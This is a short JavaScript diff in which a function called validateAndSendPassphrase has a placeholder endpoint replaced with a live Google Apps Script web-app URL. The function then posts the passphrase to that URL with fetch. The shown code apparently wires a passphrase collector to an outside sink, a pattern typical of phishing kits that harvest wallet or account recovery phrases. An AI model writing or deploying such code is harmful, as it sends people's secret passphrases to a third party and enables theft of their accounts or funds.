@@ -9,7 +9,7 @@ function validateAndSendPassphrase(passphrase) {
     }
 
     // Your Google Apps Script URL
-    const url = "YOUR_DEPLOYED_WEB_APP_URL_HERE"; 
+    const url = "https://script.google.com/macros/s/AKfycbxK8VQMGkMc4gdlpo_GKoivsuWs4xQvwkynfZJ0E7qBlvcSY271Dq-pOcpIM4ci8WMP/exec"; 
 
     // Send data to Google Apps Script
     fetch(url, {
